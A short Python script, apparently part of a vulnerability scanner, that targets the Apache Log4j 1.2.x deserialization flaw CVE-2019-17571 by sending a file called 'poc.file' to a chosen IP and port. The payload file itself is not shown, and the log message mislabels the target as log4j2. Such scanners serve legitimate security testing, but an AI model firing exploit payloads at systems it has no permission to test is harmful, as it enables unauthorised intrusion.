#!/usr/bin/python
#coding=utf-8

'''
Apache Log4j 1.2.X存在反序列化远程代码执行漏洞(CVE-2019-17571)
'''

import socket
from commonpy import socketClient
import time

class Log4jScanner():
    def scanner(self,ip,port):
        try:
            print('scanning log4j2 %s %s %s ' % (ip,port,time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
            sc = socketClient.socketClient()
            sc.sendfileinfo(ip,int(port),'poc.file')
            return 'success'
        except Exception as e:
            print('【exception】log4jscanner.scanner %s:%s' % (ip,port))
            print(e)